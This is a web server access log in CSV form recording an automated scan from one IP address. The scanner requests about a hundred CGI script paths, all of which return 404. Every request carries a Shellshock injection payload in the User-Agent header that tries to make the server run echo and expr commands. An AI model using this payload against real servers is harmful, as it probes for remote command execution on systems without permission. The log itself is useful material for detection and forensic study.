"Host","Log Name","Date Time","Time Zone","Method","URL","Response Code","Bytes Sent","Referer","User Agent"
"5.196.35.248","-","2015-05-12 03:35:09","GMT-0700","GET","/cgi-bin/dcforum.cgi",404,503,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:09","GMT-0700","GET","/cgi-bin/defaultwebpage.cgi",404,510,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:10","GMT-0700","GET","/cgi-bin/dfire.cgi",404,501,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:10","GMT-0700","GET","/cgi-bin/diagnose.cgi",404,504,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:10","GMT-0700","GET","/cgi-bin/dig.cgi",404,499,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:11","GMT-0700","GET","/cgi-bin/directorypro.cgi",404,508,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:11","GMT-0700","GET","/cgi-bin/download.cgi",404,504,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:11","GMT-0700","GET","/cgi-bin/emu/html/emumail.cgi",404,512,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:12","GMT-0700","GET","/cgi-bin/emumail.cgi",404,503,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:12","GMT-0700","GET","/cgi-bin/emumail/emumail.cgi",404,511,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:12","GMT-0700","GET","/cgi-bin/enter.cgi",404,501,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:13","GMT-0700","GET","/cgi-bin/env.cgi",404,499,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:13","GMT-0700","GET","/cgi-bin/environ.cgi",404,503,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:13","GMT-0700","GET","/cgi-bin/ezadmin.cgi",404,503,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:13","GMT-0700","GET","/cgi-bin/ezboard.cgi",404,503,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:14","GMT-0700","GET","/cgi-bin/ezman.cgi",404,501,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:14","GMT-0700","GET","/cgi-bin/ezshopper2/loadpage.cgi",404,515,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:14","GMT-0700","GET","/cgi-bin/ezshopper3/loadpage.cgi",404,515,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:15","GMT-0700","GET","/cgi-bin/ezshopper/loadpage.cgi",404,514,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:15","GMT-0700","GET","/cgi-bin/ezshopper/search.cgi",404,512,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:15","GMT-0700","GET","/cgi-bin/faqmanager.cgi",404,506,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:16","GMT-0700","GET","/cgi-bin/FileSeek2.cgi",404,505,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:16","GMT-0700","GET","/cgi-bin/FileSeek.cgi",404,504,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:16","GMT-0700","GET","/cgi-bin/finger.cgi",404,502,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:17","GMT-0700","GET","/cgi-bin/firmwarecfg",404,503,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:17","GMT-0700","GET","/cgi-bin/flexform.cgi",404,504,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:17","GMT-0700","GET","/cgi-bin/fom.cgi",404,499,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:18","GMT-0700","GET","/cgi-bin/fom/fom.cgi",404,503,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:18","GMT-0700","GET","/cgi-bin/FormHandler.cgi",404,507,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:18","GMT-0700","GET","/cgi-bin/FormMail.cgi",404,504,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:19","GMT-0700","GET","/cgi-bin/forum.cgi",404,501,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:19","GMT-0700","GET","/cgi-bin/gbadmin.cgi",404,503,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:19","GMT-0700","GET","/cgi-bin/gbook/gbook.cgi",404,507,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:20","GMT-0700","GET","/cgi-bin/generate.cgi",404,504,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:20","GMT-0700","GET","/cgi-bin/getdoc.cgi",404,502,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:20","GMT-0700","GET","/cgi-bin/gH.cgi",404,498,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:21","GMT-0700","GET","/cgi-bin/gm-authors.cgi",404,506,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:21","GMT-0700","GET","/cgi-bin/gm.cgi",404,498,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:21","GMT-0700","GET","/cgi-bin/gm-cplog.cgi",404,504,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:22","GMT-0700","GET","/cgi-bin/guestbook.cgi",404,505,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:22","GMT-0700","GET","/cgi-bin/handler",404,499,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:22","GMT-0700","GET","/cgi-bin/handler.cgi",404,503,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:23","GMT-0700","GET","/cgi-bin/handler/netsonar",404,508,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:23","GMT-0700","GET","/cgi-bin/hello",404,497,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:23","GMT-0700","GET","/cgi-bin/hello.cgi",404,501,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:23","GMT-0700","GET","/cgi-bin/helpme",404,498,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:24","GMT-0700","GET","/cgi-bin/hitview.cgi",404,503,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:24","GMT-0700","GET","/cgi-bin/hsx.cgi",404,499,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:24","GMT-0700","GET","/cgi-bin/html2chtml.cgi",404,506,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:25","GMT-0700","GET","/cgi-bin/html2wml.cgi",404,504,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:25","GMT-0700","GET","/cgi-bin/htsearch.cgi",404,504,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:25","GMT-0700","GET","/cgi-bin/icat",404,496,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:26","GMT-0700","GET","/cgi-bin/ICuGI/EST/blast_detail.cgi",404,518,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:26","GMT-0700","GET","/cgi-bin/if/admin/nph-build.cgi",404,514,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:26","GMT-0700","GET","/cgi-bin/ikonboard/help.cgi",404,510,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:27","GMT-0700","GET","/cgi-bin/ImageFolio/admin/admin.cgi",404,518,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:27","GMT-0700","GET","/cgi-bin/imageFolio.cgi",404,506,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:27","GMT-0700","GET","/cgi-bin/index.cgi",404,501,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:28","GMT-0700","GET","/cgi-bin/info.sh",404,499,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:28","GMT-0700","GET","/cgi-bin/infosrch.cgi",404,504,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:28","GMT-0700","GET","/cgi-bin/jammail.pl",404,502,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:29","GMT-0700","GET","/cgi-bin/journal.cgi",404,503,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:29","GMT-0700","GET","/cgi-bin/lastlines.cgi",404,505,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:29","GMT-0700","GET","/cgi-bin/loadpage.cgi",404,504,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:30","GMT-0700","GET","/cgi-bin/login.cgi",404,501,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:30","GMT-0700","GET","/cgi-bin/logit.cgi",404,501,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:30","GMT-0700","GET","/cgi-bin/log-reader.cgi",404,506,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:31","GMT-0700","GET","/cgi-bin/lookwho.cgi",404,503,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:31","GMT-0700","GET","/cgi-bin/lwgate.cgi",404,502,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:31","GMT-0700","GET","/cgi-bin/MachineInfo",404,503,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:32","GMT-0700","GET","/cgi-bin/magiccard.cgi",404,505,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:32","GMT-0700","GET","/cgi-bin/mail/emumail.cgi",404,508,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:32","GMT-0700","GET","/cgi-bin/maillist.cgi",404,504,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:33","GMT-0700","GET","/cgi-bin/mailnews.cgi",404,504,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:33","GMT-0700","GET","/cgi-bin/mail/nph-mr.cgi",404,507,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:33","GMT-0700","GET","/cgi-bin/main.cgi",404,500,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:33","GMT-0700","GET","/cgi-bin/main_menu.pl",404,504,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:34","GMT-0700","GET","/cgi-bin/man.sh",404,498,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:34","GMT-0700","GET","/cgi-bin/meme.cgi",404,500,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:34","GMT-0700","GET","/cgi-bin/mini_logger.cgi",404,507,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:35","GMT-0700","GET","/cgi-bin/mmstdod.cgi",404,503,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:35","GMT-0700","GET","/cgi-bin/moin.cgi",404,500,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:35","GMT-0700","GET","/cgi-bin/mojo/mojo.cgi",404,505,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:36","GMT-0700","GET","/cgi-bin/mrtg.cgi",404,500,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:36","GMT-0700","GET","/cgi-bin/mt/mt-check.cgi",404,507,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:36","GMT-0700","GET","/cgi-bin/mt/mt-load.cgi",404,506,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:37","GMT-0700","GET","/cgi-bin/mt-static/mt-check.cgi",404,514,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:37","GMT-0700","GET","/cgi-bin/mt-static/mt-load.cgi",404,513,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:37","GMT-0700","GET","/cgi-bin/musicqueue.cgi",404,506,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:38","GMT-0700","GET","/cgi-bin/myguestbook.cgi",404,507,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:38","GMT-0700","GET","/cgi-bin/.namazu.cgi",404,503,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:38","GMT-0700","GET","/cgi-bin/netauth.cgi",404,503,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:39","GMT-0700","GET","/cgi-bin/netpad.cgi",404,502,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:39","GMT-0700","GET","/cgi-bin/newsdesk.cgi",404,504,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:39","GMT-0700","GET","/cgi-bin/nlog-smb.cgi",404,504,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:40","GMT-0700","GET","/cgi-bin/nph-emumail.cgi",404,507,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:40","GMT-0700","GET","/cgi-bin/nph-exploitscanget.cgi",404,514,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:40","GMT-0700","GET","/cgi-bin/nph-publish.cgi",404,507,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:41","GMT-0700","GET","/cgi-bin/nph-test.cgi",404,504,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:41","GMT-0700","GET","/cgi-bin/pagelog.cgi",404,503,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:41","GMT-0700","GET","/cgi-bin/pbcgi.cgi",404,501,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:42","GMT-0700","GET","/cgi-bin/perlshop.cgi",404,504,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:42","GMT-0700","GET","/cgi-bin/pfdispaly.cgi",404,505,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:42","GMT-0700","GET","/cgi-bin/pfdisplay.cgi",404,505,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:43","GMT-0700","GET","/cgi-bin/phf.cgi",404,499,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:43","GMT-0700","GET","/cgi-bin/photo/manage.cgi",404,508,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:43","GMT-0700","GET","/cgi-bin/photo/protected/manage.cgi",404,518,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:44","GMT-0700","GET","/cgi-bin/php",404,495,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:44","GMT-0700","GET","/cgi-bin/php.cgi",404,499,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:44","GMT-0700","GET","/cgi-bin/php4",404,496,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:45","GMT-0700","GET","/cgi-bin/php4.cgi",404,500,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:45","GMT-0700","GET","/cgi-bin/php5.cgi",404,500,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:45","GMT-0700","GET","/cgi-bin/php5",404,496,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:45","GMT-0700","GET","/cgi-bin/php5?",404,496,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:46","GMT-0700","GET","/cgi-bin/php5-cgi",404,500,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
